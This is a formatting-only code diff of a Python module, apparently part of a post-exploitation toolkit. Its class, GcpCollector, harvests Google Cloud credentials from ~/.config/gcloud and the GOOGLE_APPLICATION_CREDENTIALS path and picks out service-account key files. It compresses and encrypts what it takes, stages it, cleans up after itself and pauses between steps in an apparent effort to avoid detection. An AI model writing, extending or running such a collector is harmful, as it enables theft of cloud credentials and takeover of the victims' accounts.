@@ -1,4 +1,3 @@
-
 from __future__ import annotations
 
 import json
@@ -11,10 +10,11 @@ from forge.utils.post.collectors.filesystem import ArtifactMetadata, BaseCollect
 
 _LOG = logging.getLogger(__name__)
 
+
 class GcpCollector(BaseCollector):
     """
     Collect GCP credentials and configurations.
-    
+
     Targets:
       - ~/.config/gcloud/
       - GOOGLE_APPLICATION_CREDENTIALS path
@@ -51,7 +51,12 @@ class GcpCollector(BaseCollector):
                             # Basic check for a service account key file
                             try:
                                 content = json.loads(p.read_text(encoding="utf-8"))
-                            except (OSError, PermissionError, UnicodeDecodeError, json.JSONDecodeError):
+                            except (
+                                OSError,
+                                PermissionError,
+                                UnicodeDecodeError,
+                                json.JSONDecodeError,
+                            ):
                                 continue
 
                             if content.get("type") == "service_account":
@@ -104,9 +109,9 @@ class GcpCollector(BaseCollector):
             path = Path(artifact.source_path)
             if not path.exists():
                 return None
-            
-            data    = path.read_bytes()
-            sha256  = self._sha256(data)
+
+            data = path.read_bytes()
+            sha256 = self._sha256(data)
             payload = self._compress_and_encrypt(data)
             del data
 
@@ -116,10 +121,10 @@ class GcpCollector(BaseCollector):
             self._register_cleanup(stage_path)
 
             record = CollectedFile(
-                path       = str(path),
-                sha256     = sha256,
-                size_bytes = len(payload),
-                metadata   = artifact,
+                path=str(path),
+                sha256=sha256,
+                size_bytes=len(payload),
+                metadata=artifact,
             )
             self.persist_metadata(record)
             self._stagger_and_pause()
